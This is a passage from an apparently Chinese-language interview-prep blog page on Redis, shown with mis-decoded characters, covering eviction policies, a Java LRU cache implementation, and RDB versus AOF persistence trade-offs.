çš„æ—¶å€™ï¼Œå¦‚æœæ­¤æ—¶ key å·²ç»è¿‡æœŸï¼Œå°±åˆ é™¤ï¼Œä¸ä¼šè¿”å›ä»»ä½•ä¸œè¥¿ã€‚</p></blockquote><p>ä½†æ˜¯å®é™…ä¸Šè¿™è¿˜æ˜¯æœ‰é—®é¢˜çš„ï¼Œå¦‚æœå®šæœŸåˆ é™¤æ¼æ‰äº†å¾ˆå¤šè¿‡æœŸ keyï¼Œç„¶åä½ ä¹Ÿæ²¡åŠæ—¶å»æŸ¥ï¼Œä¹Ÿå°±æ²¡èµ°æƒ°æ€§åˆ é™¤ï¼Œæ­¤æ—¶ä¼šæ€ä¹ˆæ ·ï¼Ÿå¦‚æœå¤§é‡è¿‡æœŸ key å †ç§¯åœ¨å†…å­˜é‡Œï¼Œå¯¼è‡´ redis å†…å­˜å—è€—å°½äº†ï¼Œå’‹æ•´ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼š<strong>èµ°å†…å­˜æ·˜æ±°æœºåˆ¶</strong>ã€‚</p><h3><span id="å†…å­˜æ·˜æ±°æœºåˆ¶">å†…å­˜æ·˜æ±°æœºåˆ¶</span></h3><p>redis å†…å­˜æ·˜æ±°æœºåˆ¶æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li>noeviction: å½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œæ–°å†™å…¥æ“ä½œä¼šæŠ¥é”™ï¼Œè¿™ä¸ªä¸€èˆ¬æ²¡äººç”¨å§ï¼Œå®åœ¨æ˜¯å¤ªæ¶å¿ƒäº†ã€‚</li><li><strong>allkeys-lru</strong>ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨<strong>é”®ç©ºé—´</strong>ä¸­ï¼Œç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ keyï¼ˆè¿™ä¸ªæ˜¯<strong>æœ€å¸¸ç”¨</strong>çš„ï¼‰ã€‚</li><li>allkeys-randomï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨<strong>é”®ç©ºé—´</strong>ä¸­ï¼Œéšæœºç§»é™¤æŸä¸ª keyï¼Œè¿™ä¸ªä¸€èˆ¬æ²¡äººç”¨å§ï¼Œä¸ºå•¥è¦éšæœºï¼Œè‚¯å®šæ˜¯æŠŠæœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ key ç»™å¹²æ‰å•Šã€‚</li><li>volatile-lruï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨<strong>è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´</strong>ä¸­ï¼Œç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ keyï¼ˆè¿™ä¸ªä¸€èˆ¬ä¸å¤ªåˆé€‚ï¼‰ã€‚</li><li>volatile-randomï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨<strong>è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´</strong>ä¸­ï¼Œ<strong>éšæœºç§»é™¤</strong>æŸä¸ª keyã€‚</li><li>volatile-ttlï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨<strong>è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´</strong>ä¸­ï¼Œæœ‰<strong>æ›´æ—©è¿‡æœŸæ—¶é—´</strong>çš„ key ä¼˜å…ˆç§»é™¤ã€‚</li></ul><h3><span id="æ‰‹å†™ä¸€ä¸ª-lru-ç®—æ³•">æ‰‹å†™ä¸€ä¸ª LRU ç®—æ³•</span></h3><p>ä½ å¯ä»¥ç°åœºæ‰‹å†™æœ€åŸå§‹çš„ LRU ç®—æ³•ï¼Œé‚£ä¸ªä»£ç é‡å¤ªå¤§äº†ï¼Œä¼¼ä¹ä¸å¤ªç°å®ã€‚</p><p>ä¸æ±‚è‡ªå·±çº¯æ‰‹å·¥ä»åº•å±‚å¼€å§‹æ‰“é€ å‡ºè‡ªå·±çš„ LRUï¼Œä½†æ˜¯èµ·ç è¦çŸ¥é“å¦‚ä½•åˆ©ç”¨å·²æœ‰çš„ JDK æ•°æ®ç»“æ„å®ç°ä¸€ä¸ª Java ç‰ˆçš„ LRUã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="type">int</span> cap,count;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    Node head,tail;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="type">int</span> val,key;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> value)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.key=key;</span><br><span class="line">            <span class="built_in">this</span>.val=value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        cap=capacity;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        head=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        tail=<span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="literal">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(n);</span><br><span class="line">        add(n);</span><br><span class="line">        <span class="keyword">return</span> n.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">n</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="literal">null</span>)&#123;</span><br><span class="line">            n = <span class="keyword">new</span> <span class="title class_">Node</span>(key,value);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            add(n);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            n.val=value;</span><br><span class="line">            remove(n);</span><br><span class="line">            add(n);</span><br><span class="line">        &#125;<span class="keyword">if</span>(count&gt;cap)&#123;</span><br><span class="line">            Node del=tail.pre;</span><br><span class="line">            remove(del);</span><br><span class="line">            map.remove(del.key);</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">        Node after=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        n.next=after;</span><br><span class="line">        after.pre=n;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Node n)</span>&#123;</span><br><span class="line">         Node before=n.pre,after=n.next;</span><br><span class="line">         before.next=after;</span><br><span class="line">         after.pre=before;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="redis-çš„æŒä¹…åŒ–æœ‰å“ªå‡ ç§æ–¹å¼ä¸åŒçš„æŒä¹…åŒ–æœºåˆ¶éƒ½æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹æŒä¹…åŒ–æœºåˆ¶å…·ä½“åº•å±‚æ˜¯å¦‚ä½•å®ç°çš„">redis çš„æŒä¹…åŒ–æœ‰å“ªå‡ ç§æ–¹å¼ï¼Ÿä¸åŒçš„æŒä¹…åŒ–æœºåˆ¶éƒ½æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼ŸæŒä¹…åŒ–æœºåˆ¶å…·ä½“åº•å±‚æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>redis å¦‚æœä»…ä»…åªæ˜¯å°†æ•°æ®ç¼“å­˜åœ¨å†…å­˜é‡Œé¢ï¼Œå¦‚æœ redis å®•æœºäº†å†é‡å¯ï¼Œå†…å­˜é‡Œçš„æ•°æ®å°±å…¨éƒ¨éƒ½å¼„ä¸¢äº†å•Šã€‚ä½ å¿…é¡»å¾—ç”¨ redis çš„æŒä¹…åŒ–æœºåˆ¶ï¼Œå°†æ•°æ®å†™å…¥å†…å­˜çš„åŒæ—¶ï¼Œå¼‚æ­¥çš„æ…¢æ…¢çš„å°†æ•°æ®å†™å…¥ç£ç›˜æ–‡ä»¶é‡Œï¼Œè¿›è¡ŒæŒä¹…åŒ–ã€‚</p><p>å¦‚æœ redis å®•æœºé‡å¯ï¼Œè‡ªåŠ¨ä»ç£ç›˜ä¸ŠåŠ è½½ä¹‹å‰æŒä¹…åŒ–çš„ä¸€äº›æ•°æ®å°±å¯ä»¥äº†ï¼Œä¹Ÿè®¸ä¼šä¸¢å¤±å°‘è®¸æ•°æ®ï¼Œä½†æ˜¯è‡³å°‘ä¸ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½å¼„ä¸¢ã€‚</p><p>è¿™ä¸ªå…¶å®ä¸€æ ·ï¼Œé’ˆå¯¹çš„éƒ½æ˜¯ redis çš„ç”Ÿäº§ç¯å¢ƒå¯èƒ½é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼Œå°±æ˜¯ redis è¦æ˜¯æŒ‚äº†å†é‡å¯ï¼Œå†…å­˜é‡Œçš„æ•°æ®ä¸å°±å…¨ä¸¢äº†ï¼Ÿèƒ½ä¸èƒ½é‡å¯çš„æ—¶å€™æŠŠæ•°æ®ç»™æ¢å¤äº†ï¼Ÿ</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>æŒä¹…åŒ–ä¸»è¦æ˜¯åšç¾éš¾æ¢å¤ã€æ•°æ®æ¢å¤ï¼Œä¹Ÿå¯ä»¥å½’ç±»åˆ°é«˜å¯ç”¨çš„ä¸€ä¸ªç¯èŠ‚ä¸­å»ï¼Œæ¯”å¦‚ä½  redis æ•´ä¸ªæŒ‚äº†ï¼Œç„¶å redis å°±ä¸å¯ç”¨äº†ï¼Œä½ è¦åšçš„äº‹æƒ…å°±æ˜¯è®© redis å˜å¾—å¯ç”¨ï¼Œå°½å¿«å˜å¾—å¯ç”¨ã€‚</p><p>é‡å¯ redisï¼Œå°½å¿«è®©å®ƒå¯¹å¤–æä¾›æœåŠ¡ï¼Œå¦‚æœæ²¡åšæ•°æ®å¤‡ä»½ï¼Œè¿™æ—¶å€™ redis å¯åŠ¨äº†ï¼Œä¹Ÿä¸å¯ç”¨å•Šï¼Œæ•°æ®éƒ½æ²¡äº†ã€‚</p><p>å¾ˆå¯èƒ½è¯´ï¼Œå¤§é‡çš„è¯·æ±‚è¿‡æ¥ï¼Œç¼“å­˜å…¨éƒ¨æ— æ³•å‘½ä¸­ï¼Œåœ¨ redis é‡Œæ ¹æœ¬æ‰¾ä¸åˆ°æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™å°±æ­»å®šäº†ï¼Œå‡ºç°<strong>ç¼“å­˜é›ªå´©</strong>é—®é¢˜ã€‚æ‰€æœ‰è¯·æ±‚æ²¡æœ‰åœ¨ redis å‘½ä¸­ï¼Œå°±ä¼šå» mysql æ•°æ®åº“è¿™ç§æ•°æ®æºå¤´ä¸­å»æ‰¾ï¼Œä¸€ä¸‹å­ mysql æ‰¿æ¥é«˜å¹¶å‘ï¼Œç„¶åå°±æŒ‚äº†â€¦</p><p>å¦‚æœä½ æŠŠ redis æŒä¹…åŒ–åšå¥½ï¼Œå¤‡ä»½å’Œæ¢å¤æ–¹æ¡ˆåšåˆ°ä¼ä¸šçº§çš„ç¨‹åº¦ï¼Œé‚£ä¹ˆå³ä½¿ä½ çš„ redis æ•…éšœäº†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¤‡ä»½æ•°æ®ï¼Œå¿«é€Ÿæ¢å¤ï¼Œä¸€æ—¦æ¢å¤ç«‹å³å¯¹å¤–æä¾›æœåŠ¡ã€‚</p><h3><span id="redis-æŒä¹…åŒ–çš„ä¸¤ç§æ–¹å¼">redis æŒä¹…åŒ–çš„ä¸¤ç§æ–¹å¼</span></h3><ul><li>RDBï¼šRDB æŒä¹…åŒ–æœºåˆ¶ï¼Œæ˜¯å¯¹ redis ä¸­çš„æ•°æ®æ‰§è¡Œ<strong>å‘¨æœŸæ€§</strong>çš„æŒä¹…åŒ–ã€‚</li><li>AOFï¼šAOF æœºåˆ¶å¯¹æ¯æ¡å†™å…¥å‘½ä»¤ä½œä¸ºæ—¥å¿—ï¼Œä»¥ <code>append-only</code> çš„æ¨¡å¼å†™å…¥ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ï¼Œåœ¨ redis é‡å¯çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡<strong>å›æ”¾</strong> AOF æ—¥å¿—ä¸­çš„å†™å…¥æŒ‡ä»¤æ¥é‡æ–°æ„å»ºæ•´ä¸ªæ•°æ®é›†ã€‚</li></ul><p>é€šè¿‡ RDB æˆ– AOFï¼Œéƒ½å¯ä»¥å°† redis å†…å­˜ä¸­çš„æ•°æ®ç»™æŒä¹…åŒ–åˆ°ç£ç›˜ä¸Šé¢æ¥ï¼Œç„¶åå¯ä»¥å°†è¿™äº›æ•°æ®å¤‡ä»½åˆ°åˆ«çš„åœ°æ–¹å»ï¼Œæ¯”å¦‚è¯´é˜¿é‡Œäº‘ç­‰äº‘æœåŠ¡ã€‚</p><p>å¦‚æœ redis æŒ‚äº†ï¼ŒæœåŠ¡å™¨ä¸Šçš„å†…å­˜å’Œç£ç›˜ä¸Šçš„æ•°æ®éƒ½ä¸¢äº†ï¼Œå¯ä»¥ä»äº‘æœåŠ¡ä¸Šæ‹·è´å›æ¥ä¹‹å‰çš„æ•°æ®ï¼Œæ”¾åˆ°æŒ‡å®šçš„ç›®å½•ä¸­ï¼Œç„¶åé‡æ–°å¯åŠ¨ redisï¼Œredis å°±ä¼šè‡ªåŠ¨æ ¹æ®æŒä¹…åŒ–æ•°æ®æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œå»æ¢å¤å†…å­˜ä¸­çš„æ•°æ®ï¼Œç»§ç»­å¯¹å¤–æä¾›æœåŠ¡ã€‚</p><p>å¦‚æœåŒæ—¶ä½¿ç”¨ RDB å’Œ AOF ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶ï¼Œé‚£ä¹ˆåœ¨ redis é‡å¯çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ <strong>AOF</strong> æ¥é‡æ–°æ„å»ºæ•°æ®ï¼Œå› ä¸º AOF ä¸­çš„<strong>æ•°æ®æ›´åŠ å®Œæ•´</strong>ã€‚</p><h4><span id="rdb-ä¼˜ç¼ºç‚¹">RDB ä¼˜ç¼ºç‚¹</span></h4><ul><li>RDB ä¼šç”Ÿæˆå¤šä¸ªæ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ•°æ®æ–‡ä»¶éƒ½ä»£è¡¨äº†æŸä¸€ä¸ªæ—¶åˆ»ä¸­ redis çš„æ•°æ®ï¼Œè¿™ç§å¤šä¸ªæ•°æ®æ–‡ä»¶çš„æ–¹å¼ï¼Œ<strong>éå¸¸é€‚åˆåšå†·å¤‡</strong>ï¼Œå¯ä»¥å°†è¿™ç§å®Œæ•´çš„æ•°æ®æ–‡ä»¶å‘é€åˆ°ä¸€äº›è¿œç¨‹çš„å®‰å…¨å­˜å‚¨ä¸Šå»ï¼Œæ¯”å¦‚è¯´ Amazon çš„ S3 äº‘æœåŠ¡ä¸Šå»ï¼Œåœ¨å›½å†…å¯ä»¥æ˜¯é˜¿é‡Œäº‘çš„ ODPS åˆ†å¸ƒå¼å­˜å‚¨ä¸Šï¼Œä»¥é¢„å®šå¥½çš„å¤‡ä»½ç­–ç•¥æ¥å®šæœŸå¤‡ä»½ redis ä¸­çš„æ•°æ®ã€‚</li><li>RDB å¯¹ redis å¯¹å¤–æä¾›çš„è¯»å†™æœåŠ¡ï¼Œå½±å“éå¸¸å°ï¼Œå¯ä»¥è®© redis <strong>ä¿æŒé«˜æ€§èƒ½</strong>ï¼Œå› ä¸º redis ä¸»è¿›ç¨‹åªéœ€è¦ fork ä¸€ä¸ªå­è¿›ç¨‹ï¼Œè®©å­è¿›ç¨‹æ‰§è¡Œç£ç›˜ IO æ“ä½œæ¥è¿›è¡Œ RDB æŒä¹…åŒ–å³å¯ã€‚</li><li>ç›¸å¯¹äº AOF æŒä¹…åŒ–æœºåˆ¶æ¥è¯´ï¼Œç›´æ¥åŸºäº RDB æ•°æ®æ–‡ä»¶æ¥é‡å¯å’Œæ¢å¤ redis è¿›ç¨‹ï¼Œæ›´åŠ å¿«é€Ÿã€‚</li><li>å¦‚æœæƒ³è¦åœ¨ redis æ•…éšœæ—¶ï¼Œå°½å¯èƒ½å°‘çš„ä¸¢å¤±æ•°æ®ï¼Œé‚£ä¹ˆ RDB æ²¡æœ‰ AOF å¥½ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒRDB æ•°æ®å¿«ç…§æ–‡ä»¶ï¼Œéƒ½æ˜¯æ¯éš” 5 åˆ†é’Ÿï¼Œæˆ–è€…æ›´é•¿æ—¶é—´ç”Ÿæˆä¸€æ¬¡ï¼Œè¿™ä¸ªæ—¶å€™å°±å¾—æ¥å—ä¸€æ—¦ redis è¿›ç¨‹å®•æœºï¼Œé‚£ä¹ˆä¼šä¸¢å¤±æœ€è¿‘ 5 åˆ†é’Ÿçš„æ•°æ®ã€‚</li><li>RDB æ¯æ¬¡åœ¨ fork å­è¿›ç¨‹æ¥æ‰§è¡Œ RDB å¿«ç…§æ•°æ®æ–‡ä»¶ç”Ÿæˆçš„æ—¶å€™ï¼Œå¦‚æœæ•°æ®æ–‡ä»¶ç‰¹åˆ«å¤§ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¯¹å®¢æˆ·ç«¯æä¾›çš„æœåŠ¡æš‚åœæ•°æ¯«ç§’ï¼Œæˆ–è€…ç”šè‡³æ•°ç§’ã€‚</li></ul><h4><span id="aof-ä¼˜ç¼ºç‚¹">AOF ä¼˜ç¼ºç‚¹</span></h4><ul><li>AOF å¯ä»¥æ›´å¥½çš„ä¿æŠ¤æ•°æ®ä¸ä¸¢å¤±ï¼Œä¸€èˆ¬ AOF ä¼šæ¯éš” 1 ç§’ï¼Œé€šè¿‡ä¸€ä¸ªåå°çº¿ç¨‹æ‰§è¡Œä¸€æ¬¡<code>fsync</code>æ“ä½œï¼Œæœ€å¤šä¸¢å¤± 1 ç§’é’Ÿçš„æ•°æ®ã€‚</li><li>AOF æ—¥å¿—æ–‡ä»¶ä»¥ <code>append-only</code> æ¨¡å¼å†™å…¥ï¼Œæ‰€ä»¥æ²¡æœ‰ä»»ä½•ç£ç›˜å¯»å€çš„å¼€é”€ï¼Œå†™å…¥æ€§èƒ½éå¸¸é«˜ï¼Œè€Œä¸”æ–‡ä»¶ä¸å®¹æ˜“ç ´æŸï¼Œå³ä½¿æ–‡ä»¶å°¾éƒ¨ç ´æŸï¼Œä¹Ÿå¾ˆå®¹æ˜“ä¿®å¤ã€‚</li><li>AOF æ—¥å¿—æ–‡ä»¶å³ä½¿è¿‡å¤§çš„æ—¶å€™ï¼Œå‡ºç°åå°é‡å†™æ“ä½œï¼Œä¹Ÿä¸ä¼šå½±å“å®¢æˆ·ç«¯çš„è¯»å†™ã€‚å› ä¸ºåœ¨ <code>rewrite</code> log çš„æ—¶å€™ï¼Œä¼šå¯¹å…¶ä¸­çš„æŒ‡ä»¤è¿›è¡Œå‹ç¼©ï¼Œåˆ›å»ºå‡ºä¸€ä»½éœ€è¦æ¢å¤æ•°æ®çš„æœ€å°æ—¥å¿—å‡ºæ¥ã€‚åœ¨åˆ›å»ºæ–°æ—¥å¿—æ–‡ä»¶çš„æ—¶å€™ï¼Œè€çš„æ—¥å¿—æ–‡ä»¶è¿˜æ˜¯ç…§å¸¸å†™å…¥ã€‚å½“æ–°çš„ merge åçš„æ—¥å¿—æ–‡ä»¶ ready çš„æ—¶å€™ï¼Œå†äº¤æ¢æ–°è€æ—¥å¿—æ–‡ä»¶å³å¯ã€‚</li><li>AOF æ—¥å¿—æ–‡ä»¶çš„å‘½ä»¤é€šè¿‡éå¸¸å¯è¯»çš„æ–¹å¼è¿›è¡Œè®°å½•ï¼Œè¿™ä¸ªç‰¹æ€§éå¸¸<strong>é€‚åˆåšç¾éš¾æ€§çš„è¯¯åˆ é™¤çš„ç´§æ€¥æ¢å¤</strong>ã€‚æ¯”å¦‚æŸäººä¸å°å¿ƒç”¨ <code>flushall</code> å‘½ä»¤æ¸…ç©ºäº†æ‰€æœ‰æ•°æ®ï¼Œåªè¦è¿™ä¸ªæ—¶å€™åå° <code>rewrite</code> è¿˜æ²¡æœ‰å‘ç”Ÿï¼Œé‚£ä¹ˆå°±å¯ä»¥ç«‹å³æ‹·è´ AOF æ–‡ä»¶ï¼Œå°†æœ€åä¸€æ¡ <code>flushall</code> å‘½ä»¤ç»™åˆ äº†ï¼Œç„¶åå†å°†è¯¥ <code>AOF</code> æ–‡ä»¶æ”¾å›å»ï¼Œå°±å¯ä»¥é€šè¿‡æ¢å¤æœºåˆ¶ï¼Œè‡ªåŠ¨æ¢å¤æ‰€æœ‰æ•°æ®ã€‚</li><li>å¯¹äºåŒä¸€ä»½æ•°æ®æ¥è¯´ï¼ŒAOF æ—¥å¿—æ–‡ä»¶é€šå¸¸æ¯” RDB æ•°æ®å¿«ç…§æ–‡ä»¶æ›´å¤§ã€‚</li><li>AOF å¼€å¯åï¼Œæ”¯æŒçš„å†™ QPS ä¼šæ¯” RDB æ”¯æŒçš„å†™ QPS ä½ï¼Œå› ä¸º AOF ä¸€èˆ¬ä¼šé…ç½®æˆæ¯ç§’ <code>fsync</code> ä¸€æ¬¡æ—¥å¿—æ–‡ä»¶ï¼Œå½“ç„¶ï¼Œæ¯ç§’ä¸€æ¬¡ <code>fsync</code>ï¼Œæ€§èƒ½ä¹Ÿè¿˜æ˜¯å¾ˆé«˜çš„ã€‚ï¼ˆå¦‚æœå®æ—¶å†™å…¥ï¼Œé‚£ä¹ˆ QPS ä¼šå¤§é™ï¼Œredis æ€§èƒ½ä¼šå¤§å¤§é™ä½ï¼‰</li><li>ä»¥å‰ AOF å‘ç”Ÿè¿‡ bugï¼Œå°±æ˜¯é€šè¿‡ AOF è®°å½•çš„æ—¥å¿—ï¼Œè¿›è¡Œæ•°æ®æ¢å¤çš„æ—¶å€™ï¼Œæ²¡æœ‰æ¢å¤ä¸€æ¨¡ä¸€æ ·çš„æ•°æ®å‡ºæ¥ã€‚æ‰€ä»¥è¯´ï¼Œç±»ä¼¼ AOF è¿™ç§è¾ƒä¸ºå¤æ‚çš„åŸºäºå‘½ä»¤æ—¥å¿— &#x2F; merge &#x2F; å›æ”¾çš„æ–¹å¼ï¼Œæ¯”åŸºäº RDB æ¯æ¬¡æŒä¹…åŒ–ä¸€ä»½å®Œæ•´çš„æ•°æ®å¿«ç…§æ–‡ä»¶çš„æ–¹å¼ï¼Œæ›´åŠ è„†å¼±ä¸€äº›ï¼Œå®¹æ˜“æœ‰ bugã€‚ä¸è¿‡ AOF å°±æ˜¯ä¸ºäº†é¿å… rewrite è¿‡ç¨‹å¯¼è‡´çš„ bugï¼Œå› æ­¤æ¯æ¬¡ rewrite å¹¶ä¸æ˜¯åŸºäºæ—§çš„æŒ‡ä»¤æ—¥å¿—è¿›è¡Œ merge çš„ï¼Œè€Œæ˜¯<strong>åŸºäºå½“æ—¶å†…å­˜ä¸­çš„æ•°æ®è¿›è¡ŒæŒ‡ä»¤çš„é‡æ–°æ„å»º</strong>ï¼Œè¿™æ ·å¥å£®æ€§ä¼šå¥½å¾ˆå¤šã€‚</li></ul><h3><span id="rdb-å’Œ-aof-åˆ°åº•è¯¥å¦‚ä½•é€‰æ‹©">RDB å’Œ AOF åˆ°åº•è¯¥å¦‚ä½•é€‰æ‹©</span></h3><ul><li>ä¸è¦ä»…ä»…ä½¿ç”¨ RDBï¼Œå› ä¸ºé‚£æ ·ä¼šå¯¼è‡´ä½ ä¸¢å¤±å¾ˆå¤šæ•°æ®ï¼›</li><li>ä¹Ÿä¸è¦ä»…ä»…ä½¿ç”¨ AOFï¼Œå› ä¸ºé‚£æ ·æœ‰ä¸¤ä¸ªé—®é¢˜ï¼šç¬¬ä¸€ï¼Œä½ é€šè¿‡ AOF åšå†·å¤‡ï¼Œæ²¡æœ‰ RDB åšå†·å¤‡æ¥çš„æ¢å¤é€Ÿåº¦æ›´å¿«ï¼›ç¬¬äºŒï¼ŒRDB æ¯æ¬¡ç®€å•ç²—æš´ç”Ÿæˆæ•°æ®å¿«ç…§ï¼Œæ›´åŠ å¥å£®ï¼Œå¯ä»¥é¿å… AOF è¿™ç§å¤æ‚çš„å¤‡ä»½å’Œæ¢å¤æœºåˆ¶çš„ bugï¼›</li><li>redis æ”¯æŒåŒæ—¶å¼€å¯å¼€å¯ä¸¤ç§æŒä¹…åŒ–æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ç»¼åˆä½¿ç”¨ AOF å’Œ RDB ä¸¤ç§æŒä¹…åŒ–æœºåˆ¶ï¼Œç”¨ AOF æ¥ä¿è¯æ•°æ®ä¸ä¸¢å¤±ï¼Œä½œä¸ºæ•°æ®æ¢å¤çš„ç¬¬ä¸€é€‰æ‹©; ç”¨ RDB æ¥åšä¸åŒç¨‹åº¦çš„å†·å¤‡ï¼Œåœ¨ AOF æ–‡ä»¶éƒ½ä¸¢å¤±æˆ–æŸåä¸å¯ç”¨çš„æ—¶å€™ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ RDB æ¥è¿›è¡Œå¿«é€Ÿçš„æ•°æ®æ¢å¤ã€‚</li></ul><h1><span id="å¦‚ä½•ä¿è¯ç¼“å­˜ä¸æ•°æ®åº“çš„åŒå†™ä¸€è‡´æ€§">å¦‚ä½•ä¿è¯ç¼“å­˜ä¸æ•°æ®åº“çš„åŒå†™ä¸€è‡´æ€§ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>ä½ åªè¦ç”¨ç¼“å­˜ï¼Œå°±å¯èƒ½ä¼šæ¶‰åŠåˆ°ç¼“å­˜ä¸æ•°æ®åº“åŒå­˜å‚¨åŒå†™ï¼Œä½ åªè¦æ˜¯åŒå†™ï¼Œå°±ä¸€å®šä¼šæœ‰æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ï¼Œé‚£ä¹ˆä½ å¦‚ä½•è§£å†³ä¸€è‡´æ€§é—®é¢˜ï¼Ÿ</p><h2><span 